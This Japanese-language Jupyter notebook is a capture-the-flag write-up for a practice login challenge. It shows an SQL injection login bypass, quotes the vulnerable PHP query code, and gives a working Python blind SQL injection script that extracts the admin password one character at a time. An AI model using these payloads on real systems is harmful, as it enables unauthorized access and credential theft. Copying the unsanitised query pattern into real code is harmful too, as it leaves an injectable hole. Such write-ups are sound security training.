{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Q6 Login"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 問題URL \n",
    "http://ctfq.sweetduet.info:10080/~q6/\n",
    "## 概要\n",
    "IDとPASSの入力フォームがある。`First, login as \"admin\". ` とメッセージが表示されている。"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### SQLインジェクションしてみる\n",
    "IDに`admin`、PASSに`' OR 'hoge' == 'hoge` を入力して送信。\n",
    "\n",
    "すると以下のメッセージが表示される。フラグはadminのパスワードらしい。"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Congratulations!  \n",
    "It's too easy?  \n",
    "Don't worry.\n",
    "The flag is admin's password.\n",
    "\n",
    "Hint:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```\n",
    "function h($s){return htmlspecialchars($s,ENT_QUOTES,'UTF-8');}\n",
    "\n",
    "$id = isset($_POST['id']) ? $_POST['id'] : '';\n",
    "$pass = isset($_POST['pass']) ? $_POST['pass'] : '';\n",
    "$login = false;\n",
    "$err = '';\n",
    "\n",
    "if ($id!=='')\n",
    "{\n",
    "    $db = new PDO('sqlite:database.db');\n",
    "    $r = $db->query(\"SELECT * FROM user WHERE id='$id' AND pass='$pass'\");\n",
    "    $login = $r && $r->fetch();\n",
    "    if (!$login)\n",
    "        $err = 'Login Failed';\n",
    "}\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ブラインドSQLについて\n",
    "ブラインドSQLインジェクションはクエリの結果が表示されない場合に、SQLインジェクションによりデータを盗みだす手法。  \n",
    "一文字ずつ結果をチェックしていくことで表示されないデータを割り出すことができる。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "import urllib\n",
    "import urllib.request\n",
    "\n",
    "def blindSQL(sql):\n",
    "    url = 'http://ctfq.sweetduet.info:10080/~q6/'\n",
    "    payload = {\n",
    "        'id' : sql,\n",
    "        'pass' : 'hogehoge'\n",
    "    }\n",
    "    payload=urllib.parse.urlencode(payload)\n",
    "    payload = payload.encode('ascii')\n",
    "    response = urllib.request.urlopen(url,payload)\n",
    "    \n",
    "    return urllib.request.urlopen(url,payload)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### パスワード長の特定\n",
    "以下のスクリプトでパスワード長を特定する。  \n",
    "正解判定は先程のインジェクション成功時の文字列長(ほどほどに長ければなんでも良い)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "length of the password is 21\n"
     ]
    }
   ],
   "source": [
    "for i in range(1, 100):\n",
    "    sql = 'admin\\' AND (SELECT LENGTH(pass) FROM user WHERE id = \\'admin\\') = {counter} --'.format(counter = i)\n",
    "    response = blindSQL(sql)\n",
    "    if len(response.read()) > 2000:\n",
    "        print('length of the password is {counter}'.format(counter = i))\n",
    "        break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "これによりパスワード長は21と判明。  \n",
    "次に一文字ずつパスワードを調べていく。  \n",
    "文字コードの対応は以下の通り"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_`abcdefghijklmnopqrstuvwxyz'"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "text=''\n",
    "for i in range(48,123):\n",
    "    text+=chr(i)\n",
    "text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "FLAG_KpWa4ji3uZk6TrPK"
     ]
    }
   ],
   "source": [
    "for index in range(1, 22):\n",
    "    for char_number in range(48, 123):\n",
    "        char = chr(char_number)\n",
    "        sql = 'admin\\' AND SUBSTR((SELECT pass FROM user WHERE id = \\'admin\\'), {index}, 1) = \\'{char}\\' --'.format(index = index, char = char)\n",
    "        response = blindSQL(sql)\n",
    "        if len(response.read()) > 2000:\n",
    "            print(char, end=\"\")\n",
    "            break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## SQL構文\n",
    "### SELECT文\n",
    "`SELECT フィールド名(カラム名) FROM テーブル名`\n",
    "### WHERE文\n",
    "任意のフィールドから、条件にマッチしたデータのみを取得する  \n",
    "`SELECT フィールド名(カラム名) FROM テーブル名 WHERE 条件式`\n",
    "### SUBSTR文\n",
    "文字列から指定した箇所を抽出する  \n",
    "`SUBSTR 文字列　開始位置、抽出文字数`"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 参考URL\n",
    "https://qiita.com/__k_onishi__/items/f0e8d6c8f0b6c6974ed9"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
